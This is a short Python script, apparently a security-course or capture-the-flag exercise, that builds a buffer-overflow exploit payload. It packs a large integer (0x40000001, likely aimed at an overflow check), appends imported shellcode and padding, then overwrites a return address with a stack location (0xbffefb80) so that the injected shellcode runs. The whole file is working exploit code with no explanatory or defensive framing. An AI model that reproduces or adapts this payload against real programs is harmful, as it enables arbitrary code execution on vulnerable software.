import sys
import struct
from shellcode import shellcode

output = ""
output += struct.pack('<I', 1073741825)
output += shellcode
output += "\xAA"*7
output += "\x80\xfb\xfe\xbf"
sys.stdout.write(output)

